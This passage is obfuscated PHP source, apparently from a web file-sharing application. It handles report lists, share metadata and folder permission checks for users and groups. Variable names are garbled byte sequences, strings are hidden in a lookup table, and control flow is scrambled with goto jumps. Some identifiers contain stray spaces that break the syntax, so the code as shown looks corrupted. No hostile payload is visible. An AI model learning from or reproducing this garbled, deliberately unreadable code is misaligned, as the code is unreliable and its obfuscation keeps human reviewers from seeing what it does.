$f©ù×Š¤–Õ[$Bã—’Ã³Ó•[1590]]); return Model($Bã—’Ã³Ó•[1690])->add($dôŸîĞ¯à±); } public function reportList($e‚õğ¼ƒ×¶) { goto fÄÀ‹çÜŸ±; bîÇòå‰–Ù: $eİ®ëŒ›‡‘ = array($C‚ÏÉò¶ç¾[1632] => $C‚ÏÉò¶ç¾[1633], $C‚ÏÉò¶ç¾[1513] => $C‚ÏÉò¶ç¾[1590]); $Døóóˆ¨Ìª = $C‚ÏÉò¶ç¾[1694] . $eİ®ëŒ›‡‘[$DÚêÛğ†‘–]; $Bİßº…ô˜ä = Model($C‚ÏÉò¶ç¾[1690])->where($A¼ÃñğµÄ¦)->order($Døóóˆ¨Ìª)->selectPage(20); goto c™Îêî×¢Ä; c™Îêî×¢Ä: if (empty($Bİßº…ô˜ä[$C‚ÏÉò¶ç¾[364]])) { return array(); } $this->_listDataApply($Bİßº…ô˜ä[$C‚ÏÉò¶ç¾[364]]); return $Bİßº…ô˜ä; goto cßÕº’¥ø™; fÄÀ‹çÜŸ±: $C‚ÏÉò¶ç¾ =& $_SERVER[°Óó£ÌİóèÅ]; $A¼ÃñğµÄ¦ = array(); if ($e‚õğ¼ƒ×¶[$C‚ÏÉò¶ç¾[467]]) { $bã²ñÅ§˜‡ = $e‚õğ¼ƒ×¶[$C‚ÏÉò¶ç¾[468]] ? $e‚õğ¼ƒ×¶[$C‚ÏÉò¶ç¾[468]] : strtotime(date($C‚ÏÉò¶ç¾[1687])); $A¼ÃñğµÄ¦[$C‚ÏÉò¶ç¾[195]] = array($C‚ÏÉò¶ç¾[332], array($e‚õğ¼ƒ×¶[$C‚ÏÉò¶ç¾[467]], $bã²ñÅ§˜‡)); } goto CªçŠïÎ’«; CªçŠïÎ’«: if (isset($e‚õğ¼ƒ×¶[$C‚ÏÉò¶ç¾[29]]) && in_array($e‚õğ¼ƒ×¶[$C‚ÏÉò¶ç¾[29]], array($C‚ÏÉò¶ç¾[384], $C‚ÏÉò¶ç¾[1691], $C‚ÏÉò¶ç¾[1692], $C‚ÏÉò¶ç¾[1693], $C‚ÏÉò¶ç¾[1349]))) { $A¼ÃñğµÄ¦[$C‚ÏÉò¶ç¾[29]] = $e‚õğ¼ƒ×¶[$C‚ÏÉò¶ç¾[29]]; } if (isset($e‚õğ¼ƒ×¶[$C‚ÏÉò¶ç¾[454]]) && in_array($e‚õğ¼ƒ×¶[$C‚ÏÉò¶ç¾[454]], array($C‚ÏÉò¶ç¾[410], $C‚ÏÉò¶ç¾[384], $C‚ÏÉò¶ç¾[1691], $C‚ÏÉò¶ç¾[1692]))) { $A¼ÃñğµÄ¦[$C‚ÏÉò¶ç¾[454]] = $e‚õğ¼ƒ×¶[$C‚ÏÉò¶ç¾[454]]; } $DÚêÛğ†‘– = Input::get($C‚ÏÉò¶ç¾[1588], $C‚ÏÉò¶ç¾[7], $C‚ÏÉò¶ç¾[1689], array($C‚ÏÉò¶ç¾[1634], $C‚ÏÉò¶ç¾[1513])); goto bîÇòå‰–Ù; cßÕº’¥ø™: } public function reportStatus($BâÎÊ×Ô¥°) { goto bìù°à; F¢Ş‘ÀÂ¯ê: return $eÆ’Ã‚ß­í; goto bÙê·´åô; dÃâõÑ¾¤ƒ: if (!$FµğÖŒâ„Á) { return !1; } $B‹²Êî¥½ = array($báè„˜Îª[454] => $BâÎÊ×Ô¥°[$báè„˜Îª[454]]); if ($BâÎÊ×Ô¥°[$báè„˜Îª[454]] == $báè„˜Îª[1692] && $FµğÖŒâ„Á[$báè„˜Îª[454]] == $báè„˜Îª[1692]) { $B‹²Êî¥½[$báè„˜Îª[454]] = 0; } goto d¨ÁÇŒ‘—›; d¨ÁÇŒ‘—›: $eÆ’Ã‚ß­í = Model($báè„˜Îª[1690])->where($e”ÅÍÒÕƒ£)->save($B‹²Êî¥½); if ($BâÎÊ×Ô¥°[$báè„˜Îª[454]] == $báè„˜Îª[1691]) { if ($FµğÖŒâ„Á[$báè„˜Îª[390]] != $báè„˜Îª[410] && $this->shareFileMeta($FµğÖŒâ„Á[$báè„˜Îª[390]])) { $this->shareFileMeta($FµğÖŒâ„Á[$báè„˜Îª[390]], 0); } return $this->remove($FµğÖŒâ„Á[$báè„˜Îª[427]]); } if ($eÆ’Ã‚ß­í && $BâÎÊ×Ô¥°[$báè„˜Îª[454]] == $báè„˜Îª[1692]) { $Bë‘‡Ñ¸ÌÚ = $B‹²Êî¥½[$báè„˜Îª[454]] == $báè„˜Îª[1692] ? 1 : 0; $this->shareFileMeta($FµğÖŒâ„Á[$báè„˜Îª[390]], $Bë‘‡Ñ¸ÌÚ); $this->removeByFile($FµğÖŒâ„Á[$báè„˜Îª[390]]); } goto F¢Ş‘ÀÂ¯ê; bìù°à: $báè„˜Îª =& $_SERVER[°Óó£ÌİóèÅ]; $e”ÅÍÒÕƒ£ = array($báè„˜Îª[376] => $BâÎÊ×Ô¥°[$báè„˜Îª[376]]); $FµğÖŒâ„Á = Model($báè„˜Îª[1690])->where($e”ÅÍÒÕƒ£)->field($báè„˜Îª[1695])->find(); goto dÃâõÑ¾¤ƒ; bÙê·´åô: } private function removeByFile($FĞ«æÊÁ‰Ö) { goto C¦Ò¶òäÅÉ; C¦Ò¶òäÅÉ: $aôÅØ˜·¥¥ =& $_SERVER[°Óó£ÌİóèÅ]; $fß’©æ’Éí = Model($aôÅØ˜·¥¥[529])->where(array($aôÅØ˜·¥¥[390] => $FĞ«æÊÁ‰Ö))->field($aôÅØ˜·¥¥[382])->select(); $bÜÔåñ‡š… = array_to_keyvalue($fß’©æ’Éí, $aôÅØ˜·¥¥[33], $aôÅØ˜·¥¥[382]); goto F®³ã×ì²; F®³ã×ì²: $aï¹×àˆ¥• = array($aôÅØ˜·¥¥[382] => array($aôÅØ˜·¥¥[7], $bÜÔåñ‡š…), $aôÅØ˜·¥¥[1664] => 1); $fß’©æ’Éí = Model($aôÅØ˜·¥¥[1523])->where($aï¹×àˆ¥•)->field($aôÅØ˜·¥¥[427])->select(); $DÍÒ¼ó³ = array_to_keyvalue($fß’©æ’Éí, $aôÅØ˜·¥¥[33], $aôÅØ˜·¥¥[427]); goto c±»‹¡µ±Ï; c±»‹¡µ±Ï: $this->remove($DÍÒ¼ó³); goto cÌÍÖˆâĞ¨; cÌÍÖˆâĞ¨: } private function shareFileMeta($b…ÏêäÂ°Ó, $EöµìÒ¸ê = null) { $a¿ğöˆ•Ğ =& $_SERVER[°Óó£ÌİóèÅ]; $DÆô†ÚĞ£ˆ = array($a¿ğöˆ•Ğ[390] => $b…ÏêäÂ°Ó, $a¿ğöˆ•Ğ[96] => $a¿ğöˆ•Ğ[1696]); if (is_null($EöµìÒ¸ê)) { return Model($a¿ğöˆ•Ğ[1697])->where($DÆô†ÚĞ£ˆ)->find(); } $DÆô†ÚĞ£ˆ[$a¿ğöˆ•Ğ[367]] = $EöµìÒ¸ê; Model($a¿ğöˆ•Ğ[1697])->add($DÆô†ÚĞ£ˆ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\x72\x63\x65\137\141\x75\164\150"; public function getAuth($E¼¾‹Ã‹Ö) { goto A±‘ßÖ²“•; c¯çõÚªëİ: return $fÍù·ô“Ğê; goto c•íÖ®’£; Eçñî¾Ì½¬: $AäÆ‰â¯İ = $this->field($CƒŠ¼µïªÕ)->order($E”¤ï¡ç–à[376])->where($b•µ±‡ ©ç)->select(); $fÍù·ô“Ğê = array(); foreach ($AäÆ‰â¯İ as $Eô‰÷ô„) { if (Model($E”¤ï¡ç–à[1699])->listData($Eô‰÷ô„[$E”¤ï¡ç–à[1683]])) { $fÍù·ô“Ğê[] = $Eô‰÷ô„; } } goto c¯çõÚªëİ; A±‘ßÖ²“•: $E”¤ï¡ç–à =& $_SERVER[°Óó£ÌİóèÅ]; $CƒŠ¼µïªÕ = $E”¤ï¡ç–à[1698]; $b•µ±‡ ©ç = array($E”¤ï¡ç–à[382] => $E¼¾‹Ã‹Ö); goto Eçñî¾Ì½¬; c•íÖ®’£: } public function setAuth($c¼ÁšôòÚÅ, $aÉ¨Ş‰À™â) { goto C®Ïî‹ˆ; F‰È×ø‹› : $bÀ—½„Œ¢ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Eï¯ìƒÊ = array(); foreach ($aÉ¨Ş‰À™â as $a¾¡İæõÊ®) { if (!in_array($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[401]], $bÀ—½„Œ¢)) { show_json(LNG($cˆĞ³ôÙÌï[1700]), !1); } if ($fíèø¸À‹æ != $Dáˆõ¯¦¿›) { if ($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[401]] == SourceModel::TYPE_GROUP) { } if ($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[403]] != 0 && !in_array($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[403]], $C˜Ì«†–±)) { } } if ($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[403]] == 0) { $a¾¡İæõÊ®[$cˆĞ³ôÙÌï[401]] = SourceModel::TYPE_USER; } $Eï¯ìƒÊ[] = array($cˆĞ³ôÙÌï[382] => $c¼ÁšôòÚÅ, $cˆĞ³ôÙÌï[401] => intval($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[401]]), $cˆĞ³ôÙÌï[403] => intval($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[403]]), $cˆĞ³ôÙÌï[1683] => intval($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[1683]]) ? intval($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[1683]]) : 0, $cˆĞ³ôÙÌï[1684] => intval($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[1684]]) ? intval($a¾¡İæõÊ®[$cˆĞ³ôÙÌï[1684]]) : -1); } goto Fª×Ç‚¢¿; Fª×Ç‚¢¿: $this->where(array($cˆĞ³ôÙÌï[423] => $c¼ÁšôòÚÅ))->delete(); $this->addAll($Eï¯ìƒÊ); return !0; goto fÍâí®ßŞ; C®Ïî‹ˆ: $cˆĞ³ôÙÌï =& $_SERVER[°Óó£ÌİóèÅ]; $AÚğˆéùã„ = Model($cˆĞ³ôÙÌï[852])->sourceInfo($c¼ÁšôòÚÅ); if ($AÚğˆéùã„[$cˆĞ³ôÙÌï[401]] != SourceModel::TYPE_GROUP) { return !1; } goto Bèò­ªÊæ¤; Bèò­ªÊæ¤: $Dáˆõ¯¦¿› = 1; $fíèø¸À‹æ = $AÚğˆéùã„[$cˆĞ³ôÙÌï[403]]; if ($fíèø¸À‹æ != $Dáˆõ¯¦¿›) { $eÄ˜äÜêèÒ = array($cˆĞ³ôÙÌï[1546] => $fíèø¸À‹æ); $C˜Ì«†–± = Model($cˆĞ³ôÙÌï[1631])->field($cˆĞ³ôÙÌï[1095])->where($eÄ˜äÜêèÒ)->select(); $C˜Ì«†–± = array_to_keyvalue($C˜Ì«†–±, $cˆĞ³ôÙÌï[33], $cˆĞ³ôÙÌï[1095]); } goto F‰È×ø‹› ; fÍâí®ßŞ: } public function authClear($e­‰ƒÔ«£) { $eùˆßÃŠŠŸ =& $_SERVER[°Óó£ÌİóèÅ]; $BŒÛ‹˜¢ñ‹ = Model($eùˆßÃŠŠŸ[852])->sourceInfo($e­‰ƒÔ«£); $C§–ååÅ¾ = array($e­‰ƒÔ«£); if ($BŒÛ‹˜¢ñ‹[$eùˆßÃŠŠŸ[383]] == $eùˆßÃŠŠŸ[384]) { $e¤Â’œ¾µå = array($eùˆßÃŠŠŸ[407] => array($eùˆßÃŠŠŸ[416], $BŒÛ‹˜¢ñ‹[$eùˆßÃŠŠŸ[381]] . $e­‰ƒÔ«£ . $eùˆßÃŠŠŸ[417])); $C§–ååÅ¾ = Model($eùˆßÃŠŠŸ[852])->field($eùˆßÃŠŠŸ[423])->where($e¤Â’œ¾µå)->getField($eùˆßÃŠŠŸ[382], !0); $C§–ååÅ¾[] = $e­‰ƒÔ«£; } $this->where(array($eùˆßÃŠŠŸ[423] => array($eùˆßÃŠŠŸ[563], $C§–ååÅ¾)))->delete(); return !0; } public function get($AİèÁÖæ´ê) { $FŞ»ÊÏíÖª = $this->getSourceList(array($AİèÁÖæ´ê), !0); return $FŞ»ÊÏíÖª[0]; } public function getSourceList($BìØ±ÛÏ, $aßƒ£Ì–­‹ = false) { goto eŒ¾‘‡Ê’ö; A›Šéœæöï: $CÔ‰†¨Šâ = array($FÈ²ë’«š[423] => array($FÈ²ë’«š[563], $Bß­†‚í–¤)); $cÀ¡§È³ó© = $this->field($D•²¦µµ½)->where($CÔ‰†¨Šâ)->select(); $cÀ¡§È³ó© = array_to_keyvalue_group($cÀ¡§È³ó©, $FÈ²ë’«š[382]); goto añ¬ï»âŸ; C·Ò¹“²¹: $Bß­†‚í–¤ = array_values(array_unique($Bß­†‚í–¤)); if (!$Bß­†‚í–¤) { return array(); } $D•²¦µµ½ = $FÈ²ë’«š[1702]; goto A›Šéœæöï; añ¬ï»âŸ: $D”øè„Ã = array(); foreach ($aßƒ£Ì–­‹ as $fàŒø½ÆÀ => $e®°ÌŒí¹) { $D”øè„Ã[$fàŒø½ÆÀ] = $this->makeSourceAuth($e®°ÌŒí¹, $cÀ¡§È³ó©); } return $D”øè„Ã; goto Cø”Ê‚‡; DŒŸÓµ‚: if (!$aßƒ£Ì–­‹) { $CÔ‰†¨Šâ = array($FÈ²ë’«š[423] => array($FÈ²ë’«š[563], $BìØ±ÛÏ)); $aßƒ£Ì–­‹ = $A´ÍÀ…µÓå->field($FÈ²ë’«š[1701])->where($CÔ‰†¨Šâ)->select(); $aßƒ£Ì–­‹ = array_to_keyvalue($aßƒ£Ì–­‹, $FÈ²ë’«š[382]); } $Bß­†‚í–¤ = $BìØ±ÛÏ; foreach ($aßƒ£Ì–­‹ as $c•—¹±»« => $D¼Ñ„®í½) { $e²ÆÒñÃ = $A´ÍÀ…µÓå->parentLevelArray($D¼Ñ„®í½[$FÈ²ë’«š[381]]); $Bß­†‚í–¤ = array_merge($Bß­†‚í–¤, $e²ÆÒñÃ, array($c•—¹±»«)); } goto C·Ò¹“²¹; eŒ¾‘‡Ê’ö: $FÈ²ë’«š =& $_SERVER[°Óó£ÌİóèÅ]; if (!$BìØ±ÛÏ) { return array(); } $A´ÍÀ…µÓå = Model($FÈ²ë’«š[852]); goto DŒŸÓµ‚; Cø”Ê‚‡: } public function authDeepCheck($E‹Ã¼˜Š‚£, $F¼³êÏ£˜¨ = false) { $C¼´Ù›ò‘Ù =& $_SERVER[°Óó£ÌİóèÅ]; if ($GLOBALS[$C¼´Ù›ò‘Ù[1030]]) { return !1; } $dõÈ‹„²• = $this->makeAuthDeep(); if (!in_array($E‹Ã¼˜Š‚£, $dõÈ‹„²•)) { return !1; } return array($C¼´Ù›ò‘Ù[1703] => -1, $C¼´Ù›ò‘Ù[1704] => array($C¼´Ù›ò‘Ù[814] => $C¼´Ù›ò‘Ù[780], $C¼´Ù›ò‘Ù[1552] => $C¼´Ù›ò‘Ù[410], $C¼´Ù›ò‘Ù[395] => LNG($C¼´Ù›ò‘Ù[1705]), $C¼´Ù›ò‘Ù[1564] => $C¼´Ù›ò‘Ù[1706])); } protected function makeAuthDeep() { goto FÊÊÇÒ“À‘; FÊÊÇÒ“À‘: $aöà¬Œ™‡¡ =& $_SERVER[°Óó£ÌİóèÅ]; static $DÓ¦ã‰î‡Ê = false; if ($DÓ¦ã‰î‡Ê) { return $DÓ¦ã‰î‡Ê; } goto d¨ÂÍò™Ã²; d¨ÂÍò™Ã²: $F—´¯’½Ë = Model($aöà¬Œ™‡¡[1707])->listData(); $aÊ˜‡œ¸Ù£ = array(); foreach ($F—´¯’½Ë as $BÒ‰æğ¾ÎÇ) { if ($BÒ‰æğ¾ÎÇ[$aöà¬Œ™‡¡[557]] == 0 && $BÒ‰æğ¾ÎÇ[$aöà¬Œ™‡¡[1566]] == $aöà¬Œ™‡¡[384]) { $aÊ˜‡œ¸Ù£[] = $BÒ‰æğ¾ÎÇ[$aöà¬Œ™‡¡[376]]; } } goto bŠîšƒÊ½ ; a£ŒÄÛßÓ½: if ($F²’õâÔÌç) { $F«‹˜‹Ù½ = array(array($aöà¬Œ™‡¡[401] => SourceModel::TYPE_USER, $aöà¬Œ™‡¡[403] => USER_ID), array($aöà¬Œ™‡¡[401] => SourceModel::TYPE_GROUP, $aöà¬Œ™‡¡[403] => array($aöà¬Œ™‡¡[563], $F²’õâÔÌç)), $aöà¬Œ™‡¡[681] => $aöà¬Œ™‡¡[1639]); } if ($aÊ˜‡œ¸Ù£) { $F«‹˜‹Ù½ = array($F«‹˜‹Ù½, $aöà¬Œ™‡¡[1683] => array($aöà¬Œ™‡¡[1708], $aÊ˜‡œ¸Ù£)); } $b¹©¼ÉØñ = $this->field($aöà¬Œ™‡¡[1709])->where($F«‹˜‹Ù½)->select(); goto Eèì›‹ó±µ; bŠîšƒÊ½ : $F²’õâÔÌç = Session::get($aöà¬Œ™‡¡[1666]); $F²’õâÔÌç = array_to_keyvalue($F²’õâÔÌç, $aöà¬Œ™‡¡[33], $aöà¬Œ™‡¡[1546]); $F«‹˜‹Ù½ = array($aöà¬Œ™‡¡[401] => SourceModel::TYPE_USER, $aöà¬Œ™‡¡[403] => USER_ID); goto a£ŒÄÛßÓ½; Eèì›‹ó±µ: $F«Ã½ãÆ = array_to_keyvalue($b¹©¼ÉØñ, $aöà¬Œ™‡¡[33], $aöà¬Œ™‡¡[382]); $DÓ¦ã‰î‡Ê = array(); $dçÕ ÙÍÌ‘ = $F²’õâÔÌç; goto b¸•ƒ œ“; c½‡×’ª†Ñ: return $DÓ¦ã‰î‡Ê; goto c½˜¬¾µ™Î; Fæİ‘ÈÂì: $dçÕ ÙÍÌ‘ = array_values(array_unique($dçÕ ÙÍÌ‘)); foreach ($dçÕ ÙÍÌ‘ as $F¸¿Ï‚íÃ) { $dà˜–‹£ = $bˆ¯æ¨Ÿë†->getInfo($F¸¿Ï‚íÃ); $DÓ¦ã‰î‡Ê[] = $dà˜–‹£[$aöà¬Œ™‡¡[858]][$aöà¬Œ™‡¡[382]]; } $DÓ¦ã‰î‡Ê = array_values(array_unique($DÓ¦ã‰î‡Ê)); goto c½‡×’ª†Ñ; B‘Í£ÜŒ: $dçÕ ÙÍÌ‘ = array_values(array_unique($dçÕ ÙÍÌ‘)); $AÈÌë¼‡÷õ = $dçÕ ÙÍÌ‘; foreach ($AÈÌë¼‡÷õ as $F¸¿Ï‚íÃ) { $dà˜–‹£ = $bˆ¯æ¨Ÿë†->getInfo($F¸¿Ï‚íÃ); $DÔ­˜¨æŒß = $F¹ÔˆÜæµ¶->parentLevelArray($dà˜–‹£[$aöà¬Œ™‡¡[381]]); $dçÕ ÙÍÌ‘ = array_merge($dçÕ ÙÍÌ‘, $DÔ­˜¨æŒß); } goto Fæİ‘ÈÂì; b¸•ƒ œ“: $F¹ÔˆÜæµ¶ = Model($aöà¬Œ™‡¡[852]); $bˆ¯æ¨Ÿë† = Model($aöà¬Œ™‡¡[1710]); if ($F«Ã½ãÆ) { $bÕ¶æÜ· = $F¹ÔˆÜæµ¶->where(array($aöà¬Œ™‡¡[382] => array($aöà¬Œ™‡¡[563], $F«Ã½ãÆ)))->select(); foreach ($bÕ¶æÜ· as $c¢óÀ„Ô“ğ) { $DÔ­˜¨æŒß = $F¹ÔˆÜæµ¶->parentLevelArray($c¢óÀ„Ô“ğ[$aöà¬Œ™‡¡[381]]); $DÓ¦ã‰î‡Ê = array_merge($DÓ¦ã‰î‡Ê, $DÔ­˜¨æŒß); $dçÕ ÙÍÌ‘[] = $c¢óÀ„Ô“ğ[$aöà¬Œ™‡¡[403]]; } } goto B‘Í£ÜŒ; c½˜¬¾µ™Î: } private function makeSourceAuth($cõ¶‚½Á·Ù, $Cˆ‘ÃÚ®) { goto A£„Ä¦’—; A£„Ä¦’—: $c÷õÍŒ‚íÆ =& $_SERVER[°Óó£ÌİóèÅ]; $AİÇÍğ²ÍŞ = Session::get($c÷õÍŒ‚íÆ[1666]); $f¥®Ï§Ş‚Í = Model($c÷õÍŒ‚íÆ[852])->parentLevelArray($cõ¶‚½Á·Ù[$c÷õÍŒ‚íÆ[381]]); goto dÜƒÒ‹¿š‰; dÜƒÒ‹¿š‰: $f¥®Ï§Ş‚Í = array_merge(array($cõ¶‚½Á·Ù[$c÷õÍŒ‚íÆ[382]]), array_reverse($f¥®Ï§Ş‚Í)); $AÓ…‘«ñÛŒ = !1; foreach ($f¥®Ï§Ş‚Í as $cóºîĞ˜áÌ) { if (!isset($Cˆ‘ÃÚ®[$cóºîĞ˜áÌ])) { continue; } $aŞ”øŠö  = $this->authMake($Cˆ‘ÃÚ®[$cóºîĞ˜áÌ]); if ($aŞ”øŠö [$c÷õÍŒ‚íÆ[1704]]) { $AÓ…‘«ñÛŒ = $aŞ”øŠö ; break; } } goto fåÂâÕ°‹; fåÂâÕ°‹: if (!$AÓ…‘«ñÛŒ) { $AİÇÍğ²ÍŞ = array_to_keyvalue($AİÇÍğ²ÍŞ, $c÷õÍŒ‚íÆ[1546]); $Dƒ‘‚Ø°ğ¡ = $cõ¶‚½Á·Ù[$c÷õÍŒ‚íÆ[403]]; $a§¹»…Ÿ•ê = isset($AİÇÍğ²ÍŞ[$Dƒ‘‚Ø°ğ¡]) ? $AİÇÍğ²ÍŞ[$Dƒ‘‚Ø°ğ¡] : !1; if ($a§¹»…Ÿ•ê) { $AÓ…‘«ñÛŒ = array($c÷õÍŒ‚íÆ[1711] => intval($a§¹»…Ÿ•ê[$c÷õÍŒ‚íÆ[557]][$c÷õÍŒ‚íÆ[557]]), $c÷õÍŒ‚íÆ[1712] => $a§¹»…Ÿ•ê[$c÷õÍŒ‚íÆ[557]]); } } if ((!$AÓ…‘«ñÛŒ || $AÓ…‘«ñÛŒ[$c÷õÍŒ‚íÆ[1703]] <= 0) && $cõ¶‚½Á·Ù[$c÷õÍŒ‚íÆ[401]] == SourceModel::TYPE_GROUP) { $AÓ…‘«ñÛŒ = $this->authDeepCheck($cõ¶‚½Á·Ù[$c÷õÍŒ‚íÆ[382]], $AÓ…‘«ñÛŒ); } return $AÓ…‘«ñÛŒ; goto CãåÚ®ĞåË; CãåÚ®ĞåË: } public function authOwnerApply($aĞò¯Ú¸šÂ) { goto fŒ†‚À’“Ò; DĞª¤„—: $cäÀÙÈ»šÒ = array(); $D–ó½ª‚¯ = array(); foreach ($b°†ÂÄÍ— as $B¥İğ¯Š => $bæÂ®½Èã½) { $DØ«Î½ƒÔ¦ = $this->authFolderOwnerUser($bæÂ®½Èã½); $cäÀÙÈ»šÒ[$B¥İğ¯Š] = $DØ«Î½ƒÔ¦; $D–ó½ª‚¯ = array_merge($D–ó½ª‚¯, $DØ«Î½ƒÔ¦[$bøˆóÒ’Ñ[424]]); if ($DØ«Î½ƒÔ¦[$bøˆóÒ’Ñ[1714]]) { break; } } goto DÆá¢¨›‹Ñ; E—ƒç›ì²×: $aĞò¯Ú¸šÂ[$bøˆóÒ’Ñ[557]][$bøˆóÒ’Ñ[1715]] = Model($bøˆóÒ’Ñ[1716])->userListInfo($D–ó½ª‚¯); return $aĞò¯Ú¸šÂ; goto f…Öˆ ’; fŒ†‚À’“Ò: $bøˆóÒ’Ñ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$aĞò¯Ú¸šÂ[$bøˆóÒ’Ñ[557]] || $aĞò¯Ú¸šÂ[$bøˆóÒ’Ñ[1713]]) { return $aĞò¯Ú¸šÂ; } if (AuthModel::authCheckRoot($aĞò¯Ú¸šÂ[$bøˆóÒ’Ñ[557]][$bøˆóÒ’Ñ[1703]])) { return $aĞò¯Ú¸šÂ; } goto f–è­; DÆá¢¨›‹Ñ: if (count($D–ó½ª‚¯) == 0) { $D–ó½ª‚¯ = $this->authFolderOwnerGroup($aĞò¯Ú¸šÂ[$bøˆóÒ’Ñ[403]]); } $D–ó½ª‚¯ = array_unique($D–ó½ª‚¯); if (AuthModel::authCheckRoot($aĞò¯Ú¸šÂ[$bøˆóÒ’Ñ[557]][$bøˆóÒ’Ñ[1703]])) { $D–ó½ª‚¯[] = USER_ID; } goto E—ƒç›ì²×; f–è­: $eòĞ¿ó£šÎ = Model($bøˆóÒ’Ñ[852])->parentLevelArray($aĞò¯Ú¸šÂ[$bøˆóÒ’Ñ[381]]); $eòĞ¿ó£šÎ = array_merge(array($aĞò¯Ú¸šÂ[$bøˆóÒ’Ñ[382]]), array_reverse($eòĞ¿ó£šÎ)); $fÚäø±¦á§ = $bøˆóÒ’Ñ[1702]; goto cÊÓ‡ƒŠöË; cÊÓ‡ƒŠöË: $cÂ§Ú½®´» = array($bøˆóÒ’Ñ[423] => array($bøˆóÒ’Ñ[563], $eòĞ¿ó£šÎ)); $b°†ÂÄÍ— = $this->field($fÚäø±¦á§)->where($cÂ§Ú½®´»)->select(); $b°†ÂÄÍ— = array_to_keyvalue_group($b°†ÂÄÍ—, $bøˆóÒ’Ñ[382]); goto DĞª¤„—; f…Öˆ ’: } private function authFolderOwnerGroup($f¾£Í­óê©) { $BàëÒòˆîË =& $_SERVER[°Óó£ÌİóèÅ]; $a³öğ¼·óÔ = Model($BàëÒòˆîË[1631])->where(array($BàëÒòˆîË[1546] => $f¾£Í­óê©))->select(); $dÇ‚³„êÒÇ = array(); if (!$a³öğ¼·óÔ) { return $dÇ‚³„êÒÇ; } foreach ($a³öğ¼·óÔ as $AøæŠÄöù) { $E×Êä®â = $this->authInfo($AøæŠÄöù); if (AuthModel::authCheckRoot($E×Êä®â[$BàëÒòˆîË[557]])) { $dÇ‚³„êÒÇ[] = $AøæŠÄöù[$BàëÒòˆîË[1095]]; } } return $dÇ‚³„êÒÇ; } private function authFolderOwnerUser($BñÅíñÕ’œ) { $b¸Ø áÈÂ’ =& $_SERVER[°Óó£ÌİóèÅ]; $Fº™¿Ê÷ƒš = array(); $Dò²ÆÅø… = !1; foreach ($BñÅíñÕ’œ as $d©ëÂ°ÛÍá) { $b¤¹±²‘¤› = $this->authInfo($d©ëÂ°ÛÍá); if ($d©ëÂ°ÛÍá[$b¸Ø áÈÂ’[403]] == $b¸Ø áÈÂ’[410]) { $Dò²ÆÅø… = !0; } if ($d©ëÂ°ÛÍá[$b¸Ø áÈÂ’[401]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($b¤¹±²‘¤›[$b¸Ø áÈÂ’[557]])) { $Fº™¿Ê÷ƒš[] = $d©ëÂ°ÛÍá[$b¸Ø áÈÂ’[403]]; } } } return array($b¸Ø áÈÂ’[424] => $Fº™¿Ê÷ƒš, $b¸Ø áÈÂ’[1714] => $Dò²ÆÅø…); } public function authMake($eŸÅ¦÷˜) { goto E¢ÀÄ†³˜í; Cé²†Æ‘£: $cÌ…®±Ëê– = $C‘à‚™‹‰ó ? $aÑåÒ¿™ƒ» : ($fñÈÆéÕÏ‰ ? $C£İÇİÇÚ± : $EØà—¬»Û¬); $Aàõ‰˜³Á’ = array($fˆ¬á«ÅÅï[1711] => intval($AÑ°¥¡œåÃ), $fˆ¬á«ÅÅï[1712] => $cÌ…®±Ëê–); return $Aàõ‰˜³Á’; goto EÂï²åºÊ¨; A¤‚Ÿ­§æÔ: $FğËœ‡— = array_to_keyvalue($dßòæÄÉÁô, $fˆ¬á«ÅÅï[33], $fˆ¬á«ÅÅï[1546]); $b¤Åªè¸§ = 0; $cŞóˆŞ‚èŸ = 0; goto cİ…è¸µëÌ; E¢ÀÄ†³˜í: $fˆ¬á«ÅÅï =& $_SERVER[°Óó£ÌİóèÅ]; if (!$eŸÅ¦÷˜) { return array($fˆ¬á«ÅÅï[1703] => 0, $fˆ¬á«ÅÅï[1704] => !1); } $dßòæÄÉÁô = Session::get($fˆ¬á«ÅÅï[1666]); goto A¤‚Ÿ­§æÔ; aÉĞùÎ: $c“Õçš†· = 0; foreach ($eŸÅ¦÷˜ as $eìãßìÁ¶) { $cÌ…®±Ëê– = $this->authInfo($eìãßìÁ¶); $AË·ïÈ²†Û = $eìãßìÁ¶[$fˆ¬á«ÅÅï[403]]; $b§Şö–¶…î = intval($cÌ…®±Ëê–[$fˆ¬á«ÅÅï[557]]); if ($eìãßìÁ¶[$fˆ¬á«ÅÅï[401]] == SourceModel::TYPE_USER && $AË·ïÈ²†Û == USER_ID) { $C‘à‚™‹‰ó = !0; $aÑåÒ¿™ƒ» = $cÌ…®±Ëê–; $b¤Åªè¸§ = $b§Şö–¶…î; } else { if ($eìãßìÁ¶[$fˆ¬á«ÅÅï[401]] == SourceModel::TYPE_GROUP && in_array($AË·ïÈ²†Û, $FğËœ‡—)) { $fñÈÆéÕÏ‰ = !0; if ($b§Şö–¶…î >= $cŞóˆŞ‚èŸ) { $cŞóˆŞ‚èŸ = $b§Şö–¶…î; $C£İÇİÇÚ± = $cÌ…®±Ëê–; } } else { if ($AË·ïÈ²†Û == 0) { $c“Õçš†· = !0; $EØà—¬»Û¬ = $cÌ…®±Ëê–; $e¹‡—„” = $b§Şö–¶…î; } } } } $AÑ°¥¡œåÃ = $C‘à‚™‹‰ó ? $b¤Åªè¸§ : ($fñÈÆéÕÏ‰ ? $cŞóˆŞ‚èŸ : $e¹‡—„”); goto Cé²†Æ‘£; EÓáƒö ·õ: $EØà—¬»Û¬ = 0; $C‘à‚™‹‰ó = 0; $fñÈÆéÕÏ‰ = 0; goto aÉĞùÎ; cİ…è¸µëÌ: $e¹‡—„” = 0; $aÑåÒ¿™ƒ» = 0; $C£İÇİÇÚ± = 0; goto EÓáƒö ·õ; EÂï²åºÊ¨: } public function authTargetInfoMake($d‚Ü±³¼Ì) { goto BµİªĞ‚Ñ¸; a¿¼Ù›Ú£: return array($aÒé¶íØ·[1717] => $a˜ÂÓƒ®ƒ, 